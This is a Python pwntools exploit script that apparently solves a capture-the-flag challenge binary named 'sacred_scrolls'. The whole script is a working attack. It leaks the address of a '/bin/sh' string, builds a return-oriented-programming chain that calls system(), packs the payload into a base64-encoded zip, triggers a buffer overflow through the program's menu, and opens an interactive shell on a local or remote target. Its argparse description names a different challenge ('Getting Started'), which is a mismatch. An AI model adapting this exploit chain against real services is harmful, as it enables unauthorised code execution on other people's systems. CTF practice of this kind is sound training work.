#!/usr/bin/env python3
from pwn import *
import os, sys, argparse

context.binary = './sacred_scrolls'
elf = context.binary

def get_process(args):
    if args.host and args.port:
        return remote(args.host, int(args.port))
    return process(elf.path)

def leak_bin_sh(p):
    p.sendafter(b'Enter your wizard tag: ', b'A' * 16)
    p.recvuntil(b'A' * 16)
    bin_sh = u64(p.recvline().strip().ljust(8, b'\0'))
    log.success(f'Leaked "/bin/sh" address: {hex(bin_sh)}')
    return bin_sh

def build_rop_payload(bin_sh_addr):
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    system = elf.plt['system']

    payload  = b'\xf0\x9f\x91\x93\xe2\x9a\xa1'  # Decorative emoji bytes
    payload += b'A' * 33
    payload += p64(pop_rdi)
    payload += p64(bin_sh_addr)
    payload += p64(pop_rdi + 1)  # ret gadget for alignment
    payload += p64(system)
    return payload

def zip_payload(payload):
    with open('spell.txt', 'wb') as f:
        f.write(payload)

    os.system('zip spell.zip spell.txt > /dev/null')
    os.remove('spell.txt')

    with open('spell.zip', 'rb') as f:
        b64_payload = b64e(f.read()).encode()

    return b64_payload

def send_payload(p, b64_payload):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'Enter file (it will be named spell.zip): ', b64_payload)

def trigger_exploit(p):
    p.sendlineafter(b'>> ', b'2')  # Unzip the file
    p.sendlineafter(b'>> ', b'3')  # Trigger the overflow

def main():
    parser = argparse.ArgumentParser(description="Exploit for Getting Started (HTB)")
    parser.add_argument('--host', help='Remote host')
    parser.add_argument('--port', help='Remote port')
    args = parser.parse_args()

    p = get_process(args)
    bin_sh_addr = leak_bin_sh(p)
    payload = build_rop_payload(bin_sh_addr)
    b64_payload = zip_payload(payload)
    send_payload(p, b64_payload)
    trigger_exploit(p)
    p.interactive()

if __name__ == '__main__':
    main()